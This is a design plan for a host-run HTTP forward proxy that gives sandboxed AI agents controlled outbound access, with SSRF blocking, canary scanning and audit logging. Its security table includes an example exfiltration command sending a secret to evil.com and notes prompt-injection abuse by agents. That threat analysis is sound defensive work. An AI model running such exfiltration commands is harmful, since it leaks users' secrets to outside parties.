# HTTP Forward Proxy for Sandboxed Agents

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Allow sandboxed agents to make outbound HTTP/HTTPS requests (npm install, pip install, curl, git clone) through a controlled HTTP forward proxy running on the host. Agents currently have zero network access during the run phase, which breaks common development workflows.

**Architecture:** The host runs an HTTP forward proxy that handles both HTTP request forwarding and HTTPS CONNECT tunneling. Docker/Apple containers (which use `--network=none`) reach the proxy via a TCP bridge over a mounted Unix socket. K8s pods (which already have networking for NATS) connect directly to the proxy exposed as a k8s Service. Subprocess mode connects directly via TCP.

**Tech Stack:** Node.js `http.createServer`, `net.connect`, Unix sockets, undici Agent, k8s Service

---

## Design Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Proxy location | Host process | Centralized control, auditing, credential isolation |
| Docker/Apple transport | Unix socket + TCP bridge | Preserves `--network=none` — proven pattern from `tcp-bridge.ts` |
| K8s transport | Direct TCP to k8s Service | Pods already have networking (NATS). No sidecar proxy needed |
| NATS-based proxying | Rejected | Overhead for large downloads, CONNECT tunneling complexity |
| K8s sidecar proxy | Rejected | Unnecessary — pod can reach host Service directly via TCP |
| Request filtering | Private IP blocking + opt-in | Block SSRF targets (cloud metadata, internal IPs). Proxy is opt-in per agent |
| Audit logging | All requests logged | Method, URL, status, bytes — written to audit provider |
| Outbound scanning | Canary token check on HTTP request bodies | Prevents canary exfiltration via proxy |
| HTTPS handling | CONNECT tunneling | Standard HTTP proxy protocol — all clients support it natively |

---

## Traffic Flow

### Docker / Apple Containers (`--network=none`)

```
Agent code (curl/npm/pip)
  → HTTP_PROXY=http://127.0.0.1:{PORT}
  → TCP bridge (inside container, on loopback)
  → Unix socket (web-proxy.sock, mounted from host)
  → Host HTTP forward proxy
  → Internet
```

Loopback networking works even with `--network=none`. The TCP bridge is a small
HTTP server inside the container that forwards all requests to the host proxy
via the mounted Unix socket. Same proven pattern as `tcp-bridge.ts` /
`anthropic-proxy.sock`.

### K8s Pods

```
Agent code (curl/npm/pip)
  → HTTP_PROXY=http://ax-web-proxy.ax.svc:3128
  → TCP (via existing pod networking — same as NATS)
  → Host pod HTTP forward proxy (k8s Service)
  → Internet
```

K8s sandbox pods already have networking for NATS (port 4222). Adding the host
proxy as an allowed egress destination in the NetworkPolicy is a one-line change.
No sidecar proxy, no NATS-based proxying, no bidirectional streaming complexity.

### Subprocess (Dev Mode)

```
Agent code (curl/npm/pip)
  → HTTP_PROXY=http://127.0.0.1:{PORT}
  → TCP (direct, same host)
  → Host HTTP forward proxy
  → Internet
```

No bridge needed — agent process can reach the host proxy directly on localhost.

---

## Components

### 1. Host HTTP Forward Proxy (`src/host/web-proxy.ts`)

A new HTTP server that handles two request types:

**HTTP forwarding:** Receives the full HTTP request, makes the outbound request,
streams the response back.

**HTTPS CONNECT tunneling:** Receives `CONNECT host:443`, establishes a raw TCP
connection to the target, then pipes bytes bidirectionally between the client
socket and the target socket. The proxy never sees the TLS plaintext.

```typescript
interface WebProxy {
  /** Port number (TCP mode) or socket path (Unix socket mode). */
  address: string | number;
  stop: () => void;
}

interface ProxyAuditEntry {
  action: 'proxy_request';
  sessionId: string;
  method: string;
  url: string;
  status: number;
  requestBytes: number;
  responseBytes: number;
  durationMs: number;
  blocked?: string;
}

/**
 * Start the HTTP forward proxy.
 * - Unix socket mode: for Docker/Apple containers (mounted into sandbox)
 * - TCP mode: for subprocess and k8s (direct connection)
 */
function startWebProxy(options: {
  /** Unix socket path OR TCP port number */
  listen: string | number;
  /** Session ID for audit logging context */
  sessionId: string;
  /** Canary token to scan for in outbound request bodies (from router) */
  canaryToken?: string;
  /** Audit log callback — wired to audit provider by host */
  onAudit?: (entry: ProxyAuditEntry) => void;
}): WebProxy;
```

**Key behaviors:**
- HTTP requests: forward via `fetch()`, stream response back
- CONNECT requests: `net.connect()` to target, pipe bidirectionally via `socket.pipe()`
- No body size limit (streaming — never buffers full response)
- Private IP blocking: reject connections to `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254` (cloud metadata), `::1`, `fe80::/10`, `fc00::/7` — reuse logic from `src/providers/web/fetch.ts`
- Audit logging: every request logged with method, URL, target host, status code, bytes transferred, session ID
- Outbound canary scanning: scan HTTP request bodies for canary tokens before forwarding (prevents exfiltration via POST/PUT)
- Graceful shutdown: close server, drain active connections

**Audit log entry structure:**
```typescript
interface ProxyAuditEntry {
  action: 'proxy_request';
  sessionId: string;
  method: string;           // GET, POST, CONNECT
  url: string;              // Full URL or host:port for CONNECT
  status: number;           // Response status code
  requestBytes: number;     // Outbound body size
  responseBytes: number;    // Inbound body size
  durationMs: number;       // Round-trip time
  blocked?: string;         // Reason if blocked (private IP, canary detected)
}
```

**Canary scanning on outbound requests:**
For HTTP requests (non-CONNECT), the proxy has access to the request body before
forwarding. It checks for canary token patterns (`CANARY-<32hex>`) using the
same `scanner.checkCanary()` logic from the router. If a canary is detected,
the request is blocked and an audit entry with `blocked: 'canary_detected'` is
written. For CONNECT tunnels, the proxy cannot inspect the encrypted payload —
this is an accepted limitation (canary scanning still works on the IPC path via
`router.processOutbound()`).

**Private IP blocking:**
Before establishing outbound connections (both HTTP forward and CONNECT), the
proxy resolves the target hostname and checks the IP against private ranges.
This prevents SSRF attacks against cloud metadata endpoints, internal services,
and localhost. Reuses `isPrivateIP()` from `src/providers/web/fetch.ts`.

### 2. TCP Bridge for Docker/Apple (`src/agent/web-proxy-bridge.ts`)

Reuses the `tcp-bridge.ts` pattern but for the forward proxy protocol:

```typescript
interface WebProxyBridge {
  port: number;
  stop: () => void;
}

/**
 * Start a local TCP-to-Unix-socket bridge for the HTTP forward proxy.
 * Listens on 127.0.0.1:{ephemeral port}, forwards to the Unix socket.
 *
 * Handles both HTTP forwarding and CONNECT tunneling over the socket.
 */
function startWebProxyBridge(unixSocketPath: string): Promise<WebProxyBridge>;
```

Unlike `tcp-bridge.ts` (which is HTTP-level forwarding via `fetch()`), this
bridge needs to handle CONNECT at the **TCP level** — when a CONNECT request
comes in, it opens a raw socket connection to the Unix socket proxy and pipes
bytes. The proxy handles the actual outbound TCP connection.

Implementation: Use `net.createServer()` instead of `http.createServer()` to
handle both HTTP and CONNECT at the raw TCP level. Parse enough of the HTTP
request to determine if it's CONNECT, then either forward the HTTP request or
establish a tunnel.

**Simpler alternative:** Use `http.createServer()` with a `'connect'` event
handler (Node.js HTTP servers emit a `'connect'` event for CONNECT method
requests, separate from the normal request handler). This avoids raw TCP parsing:

```typescript
const server = http.createServer(handleHTTPRequest);  // Regular HTTP
server.on('connect', handleCONNECTRequest);            // HTTPS tunneling
```

### 3. Integration Points

#### `src/host/server-completions.ts`

Start the web proxy alongside the existing Anthropic proxy:

```typescript
// Start web proxy for agent HTTP access
const webProxySocketPath = join(ipcSocketDir, 'web-proxy.sock');
const webProxy = startWebProxy({ listen: webProxySocketPath });
// ... pass to sandbox config
// ... cleanup in finally block
```

For subprocess mode, listen on TCP instead:
```typescript
const webProxy = startWebProxy({ listen: 0 }); // ephemeral port
```

#### `src/providers/sandbox/docker.ts` / `apple.ts`

Mount the web proxy socket into the container (same directory as IPC socket —
already mounted):

```typescript
// web-proxy.sock is in the same ipcSocketDir, already mounted
// No additional -v flag needed
```

#### `src/providers/sandbox/canonical-paths.ts`

Add `AX_WEB_PROXY_SOCKET` to `canonicalEnv()`:

```typescript
env.AX_WEB_PROXY_SOCKET = join(dirname(config.ipcSocket), 'web-proxy.sock');
```

#### Agent Runner (`src/agent/runner.ts` or `src/agent/runners/`)

Start the TCP bridge and set `HTTP_PROXY` / `HTTPS_PROXY`:

```typescript
// For container sandboxes with Unix socket
const proxySocket = process.env.AX_WEB_PROXY_SOCKET;
if (proxySocket) {
  const bridge = await startWebProxyBridge(proxySocket);
  process.env.HTTP_PROXY = `http://127.0.0.1:${bridge.port}`;
  process.env.HTTPS_PROXY = `http://127.0.0.1:${bridge.port}`;
}
```

For k8s (where `AX_WEB_PROXY_URL` is set directly):
```typescript
const proxyUrl = process.env.AX_WEB_PROXY_URL;
if (proxyUrl) {
  process.env.HTTP_PROXY = proxyUrl;
  process.env.HTTPS_PROXY = proxyUrl;
}
```

#### K8s Deployment

**Host pod:** Start web proxy on TCP port 3128:
```typescript
// In src/host/host-process.ts
const webProxy = startWebProxy({ listen: 3128 });
```

**K8s Service** (`charts/ax/templates/web-proxy-service.yaml`):
```yaml
apiVersion: v1
kind: Service
metadata:
  name: ax-web-proxy
spec:
  selector:
    app: ax-host
  ports:
    - port: 3128
      targetPort: 3128
      protocol: TCP
```

**NetworkPolicy update** (`charts/ax/templates/network-policy.yaml`):
```yaml
# Add to sandbox pod egress rules:
- to:
    - podSelector:
        matchLabels:
          app: ax-host
  ports:
    - port: 3128
      protocol: TCP
```

**Sandbox pod env:**
```yaml
- name: AX_WEB_PROXY_URL
  value: "http://ax-web-proxy.ax.svc:3128"
```

---

## Files Overview

| File | Action | Purpose |
|------|--------|---------|
| `src/host/web-proxy.ts` | **Create** | HTTP forward proxy (HTTP + CONNECT) with private IP blocking, canary scanning, audit logging |
| `src/agent/web-proxy-bridge.ts` | **Create** | TCP-to-Unix-socket bridge for Docker/Apple |
| `src/host/server-completions.ts` | **Modify** | Start/stop web proxy per completion |
| `src/host/host-process.ts` | **Modify** | Start web proxy on TCP for k8s |
| `src/providers/sandbox/canonical-paths.ts` | **Modify** | Add `AX_WEB_PROXY_SOCKET` env var |
| `src/agent/runners/pi-session.ts` | **Modify** | Start bridge, set HTTP_PROXY |
| `src/agent/runners/claude-code.ts` | **Modify** | Start bridge, set HTTP_PROXY |
| `charts/ax/templates/web-proxy-service.yaml` | **Create** | K8s Service for web proxy |
| `charts/ax/templates/network-policy.yaml` | **Modify** | Allow sandbox → web proxy egress |
| `tests/host/web-proxy.test.ts` | **Create** | Proxy unit tests |
| `tests/agent/web-proxy-bridge.test.ts` | **Create** | Bridge unit tests |

---

## Security Analysis

**Preserved invariants:**
- Docker/Apple containers keep `--network=none` — no direct internet access
- Credentials never enter containers — proxy runs on host
- IPC unchanged — web proxy is a separate channel
- Canary tokens checked on outbound HTTP request bodies
- Private IPs blocked — same SSRF protections as `web_fetch`
- All requests audit-logged with session context

**New attack surface and mitigations:**

| Attack Vector | Risk | Mitigation |
|---|---|---|
| Data exfiltration via POST/PUT | Agent sends sensitive data to external server | Canary scanning on request bodies blocks canary leakage. Audit logging enables forensic detection of other exfiltration |
| Data exfiltration via HTTPS CONNECT | Encrypted tunnel — proxy can't inspect | Accepted limitation. Canary scanning still works on IPC path (`router.processOutbound`). Audit logs capture target host:port |
| Data exfiltration via URL params | `curl https://evil.com/?secret=...` | Audit logging captures full URL. Domain allowlist (future) would block |
| SSRF against internal services | Agent probes `10.x.x.x`, `169.254.169.254` | Private IP blocking on all outbound connections (HTTP + CONNECT) |
| Supply chain attacks | Malicious npm/pip packages | Out of scope for proxy — same risk as any dev machine. Sandbox isolation limits blast radius |
| Prompt injection → proxy abuse | Injected prompt instructs agent to exfiltrate | Canary scanning catches canary leakage. Taint budget gates sensitive IPC actions. Audit trail for investigation |

**Proxy is opt-in.** Disabled by default. Agents that need network access
(package installs, git) explicitly enable it in config. This limits the attack
surface to agents that genuinely need outbound HTTP access.

**Taint budget interaction:**
Proxy traffic does NOT feed into the taint budget. Rationale: proxy traffic
(npm packages, git objects) is consumed by tools, not injected into the LLM
conversation. If an agent reads a proxied file and passes it to the LLM, it
enters the conversation through normal tool output, which is already
taint-tracked. Counting raw proxy bytes would push every `npm install` over
the taint threshold, making the proxy unusable.

**Traffic volume tracking:**
The proxy tracks total bytes per session (request + response). This is reported
as an audit metric, not a taint signal. Anomalous volume (e.g., 500MB in a
single session) can trigger alerts without blocking normal workflows.

**K8s network policy:**
- Sandbox pods gain one additional egress target (host proxy service on port 3128)
- No direct internet access from sandbox pods — proxy mediates all outbound
- Proxy runs in the trusted host pod, same security boundary as LLM proxy

**Future mitigations (not in v1):**
- Domain allowlist/blocklist in proxy config
- Rate limiting per session
- Per-domain byte quotas
- TLS interception for CONNECT scanning (requires CA cert injection — complex)

---

## Implementation Tasks

### Task 1: Create HTTP Forward Proxy (`src/host/web-proxy.ts`)

**Files:** Create `src/host/web-proxy.ts`, Create `tests/host/web-proxy.test.ts`

Build the core forward proxy with:
1. `http.createServer()` for HTTP request forwarding
2. `server.on('connect', ...)` for HTTPS CONNECT tunneling
3. Support both Unix socket and TCP listeners
4. Private IP blocking — reuse `isPrivateIP()` from `src/providers/web/fetch.ts` (extract to shared util if needed). Check resolved IP before connecting, for both HTTP forwarding and CONNECT tunneling
5. Outbound canary scanning — for HTTP requests (non-CONNECT), scan request body for canary token patterns before forwarding. Block and audit if detected
6. Audit logging — emit structured log entries (method, URL, status, bytes, duration, sessionId, blocked reason) via callback. Host wires this to the audit provider
7. Traffic volume tracking — count request/response bytes per session
8. Streaming responses (never buffer full response body; canary scan only checks request bodies, which are typically small)
9. Graceful shutdown: close server, drain active connections

**Tests:**
- HTTP GET/POST forwarding through proxy
- HTTPS CONNECT tunneling (verify bytes pass through)
- Private IP blocking (127.0.0.1, 10.x, 169.254.169.254, etc.)
- Canary token detection in request body → request blocked
- Audit log entries emitted for each request
- Unix socket listener mode
- TCP listener mode
- Connection cleanup on close
- Large response streaming

### Task 2: Create TCP-to-Unix-Socket Bridge (`src/agent/web-proxy-bridge.ts`)

**Files:** Create `src/agent/web-proxy-bridge.ts`, Create `tests/agent/web-proxy-bridge.test.ts`

Build the agent-side bridge:
1. `http.createServer()` + `server.on('connect', ...)` on `127.0.0.1:{PORT}`
2. Forward HTTP requests via `undici` Agent with `socketPath`
3. Forward CONNECT by opening raw `net.connect()` to Unix socket, piping bytes
4. Ephemeral port assignment

**Tests:**
- HTTP forwarding through bridge → Unix socket → mock proxy
- CONNECT tunneling through bridge → Unix socket → mock proxy
- Port assignment and cleanup

### Task 3: Integrate Proxy into Host Completion Flow

**Files:** Modify `src/host/server-completions.ts`

1. Start web proxy on Unix socket (`web-proxy.sock`) for container sandboxes
2. Start web proxy on TCP for subprocess mode
3. Pass socket/port info to sandbox config
4. Clean up proxy on completion end

### Task 4: Wire Up Sandbox Providers

**Files:** Modify `src/providers/sandbox/canonical-paths.ts`, verify Docker/Apple mount the socket dir

1. Add `AX_WEB_PROXY_SOCKET` to canonical env
2. Verify the IPC socket directory (which already contains `web-proxy.sock`) is mounted
3. For k8s, pass `AX_WEB_PROXY_URL` via `extraEnv`

### Task 5: Start Bridge and Set HTTP_PROXY in Agent Runners

**Files:** Modify `src/agent/runners/pi-session.ts`, `src/agent/runners/claude-code.ts`

1. Detect `AX_WEB_PROXY_SOCKET` → start TCP bridge, set `HTTP_PROXY`/`HTTPS_PROXY`
2. Detect `AX_WEB_PROXY_URL` → set `HTTP_PROXY`/`HTTPS_PROXY` directly (k8s)
3. Pass env vars to child processes (claude-code CLI, etc.)

### Task 6: K8s Deployment

**Files:** Create `charts/ax/templates/web-proxy-service.yaml`, Modify `charts/ax/templates/network-policy.yaml`, Modify `src/host/host-process.ts`

1. Start web proxy on port 3128 in host-process.ts
2. Create k8s Service pointing to host pods
3. Update NetworkPolicy to allow sandbox → proxy egress
4. Add `AX_WEB_PROXY_URL` env var to sandbox pod template

### Task 7: Integration Testing

1. Unit tests for proxy and bridge (Tasks 1-2)
2. Integration test: Docker container → bridge → proxy → mock HTTP server
3. Verify `npm install` works through proxy in subprocess mode
4. Verify HTTPS (curl https://...) works through CONNECT tunnel
